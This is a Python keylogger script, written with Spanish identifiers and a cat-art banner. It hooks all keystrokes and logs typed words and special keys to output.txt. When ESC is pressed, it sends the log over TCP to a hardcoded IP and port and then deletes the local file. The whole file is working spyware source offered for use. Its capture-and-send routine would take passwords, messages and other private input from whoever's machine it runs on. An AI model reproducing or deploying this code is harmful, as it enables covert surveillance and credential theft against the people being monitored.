import keyboard
import sys
import socket
import os
from datetime import datetime

IP_DESTINO    = "192.168.100.5"
PUERTO        = 9999
ARCHIVO_LOG   = "output.txt"

print("""
  /\_____/\\
 /  o   o  \\
( ==  ^  == )        +------------------------------+
 )         (         |   [sudo] keylogger.py        |
(           )        |   > Capturando teclas...     |
 ( (  ) (  ) )       |   > Log guardado: output.txt |
(_(__)_(__)_)        +------------------------------+

******************************************
*                                        *
*         Hecho por michaelyezzz         *
*                                        *
******************************************
""")

palabra = ""

ESPECIALES = {
    "space"     : " ",
    "enter"     : "\n[ENTER]\n",
    "backspace" : "[BACK]",
    "tab"       : "[TAB]",
    "ntilde"    : "ñ",
    "aacute"    : "á",
    "eacute"    : "é",
    "iacute"    : "í",
    "oacute"    : "ó",
    "uacute"    : "ú",
}

def guardar_en_log(texto):
    with open(ARCHIVO_LOG, "a", encoding="utf-8") as f:
        f.write(texto)

def pulsacion_tecla(pulsacion):
    global palabra
    if pulsacion.event_type != keyboard.KEY_DOWN:
        return
    nombre = pulsacion.name
    if nombre == "space":
        guardar_en_log(palabra + " ")
        resetear_palabra()
    elif nombre in ESPECIALES:
        guardar_en_log(ESPECIALES[nombre])
    elif len(nombre) == 1 and nombre.isprintable():
        palabra += nombre

def resetear_palabra():
    global palabra
    palabra = ""

def enviar_archivo(archivo, ip, puerto):
    try:
        with open(archivo, "rb") as f:
            contenido = f.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            conexion.connect((ip, puerto))
            conexion.sendall(contenido)
        print("[+] Archivo enviado correctamente.")
        os.remove(archivo)
    except Exception as e:
        print(f"[!] Error al enviar: {e}")

def detener_script():
    global palabra
    keyboard.unhook_all()
    if palabra:
        guardar_en_log(palabra)
    guardar_en_log(f"\n\n[FIN SESION: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
    enviar_archivo(ARCHIVO_LOG, IP_DESTINO, PUERTO)
    sys.exit(0)

keyboard.hook(pulsacion_tecla)

try:
    keyboard.wait("esc")
    detener_script()
except KeyboardInterrupt:
    detener_script()